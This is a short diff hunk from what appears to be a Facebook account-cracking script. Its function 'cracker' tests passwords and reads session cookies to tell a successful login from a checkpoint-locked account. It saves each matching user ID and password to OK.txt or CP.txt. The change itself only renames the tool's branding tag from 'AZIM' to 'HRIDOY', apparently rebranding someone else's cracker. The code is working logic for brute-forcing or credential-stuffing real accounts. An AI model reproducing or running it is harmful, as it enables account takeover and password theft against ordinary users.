@@ -201,14 +201,14 @@ def cracker(uid,pwx,tl):
 			if 'c_user' in fb_cookies:
 				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
 				uidx = coki[65:80]
-				print('\033[1;32m [AZIM-OK] '+uidx+'|'+pasw+'\033[0;97m')
+				print('\033[1;32m [HRIDOY-OK] '+uidx+'|'+pasw+'\033[0;97m')
 				open('OK.txt', 'a').write(uidx+'|'+pasw+'\n')
 				oks.append(uidx)
 				break
 			elif 'checkpoint' in fb_cookies:
 				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
 				uidx = coki[82:97]
-				print('\033[1;31m [AZIM-CP] '+uidx+' | '+pasw+'\033[0;97m')
+				print('\033[1;31m [HRIDOY-CP] '+uidx+' | '+pasw+'\033[0;97m')
 				open('CP.txt', 'a').write(uidx+'|'+pasw+'\n')
 				cps.append(uidx)
 				break
